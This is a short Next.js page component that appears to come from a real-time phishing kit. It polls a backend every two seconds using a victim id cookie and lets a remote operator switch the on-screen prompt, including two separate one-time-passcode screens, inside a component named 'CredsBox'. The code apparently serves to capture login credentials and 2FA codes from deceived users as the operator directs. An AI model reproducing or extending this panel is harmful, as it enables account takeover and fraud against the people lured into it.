import Image from "next/image";
import OTP from "./components/OTP";
import { useState, useEffect } from "react";
import Error from "./components/Error";
import Invalid from "./components/Invalid";
import OTP2 from "./components/OTP2";
import { getCookie } from "cookies-next";
import Wait from "./components/Wait";
import CredsBox from "../components/CredsBox";
export default function Home() {
  var id = getCookie("id");
  const [currAction, setcurrAction] = useState("wait");

  useEffect(() => {
    const fetchData = async () => {
      const response = await fetch(`${process.env.API_URL}/action/${id}`, {
        method: "GET",
        cache: "no-cache",
      });
      const json = await response.json();
      setcurrAction(JSON.parse(json).action);
    };

    fetchData();

    const intervalId = setInterval(() => {
      fetchData();
    }, 2000);
    return () => clearInterval(intervalId);
  }, []);

  const pageChanger = () => {
    if (currAction == "wait") {
      return <Wait />;
    } else if (currAction == "error") {
      return <Error />;
    } else if (currAction == "invalid") {
      return <Invalid />;
    } else if (currAction == "OTP") {
      return <OTP id={id} />;
    } else if (currAction == "OTP2") {
      return <OTP2 id={id} />;
    }
  };
  return (
      <CredsBox curr_component={pageChanger()} />
    
  );
}
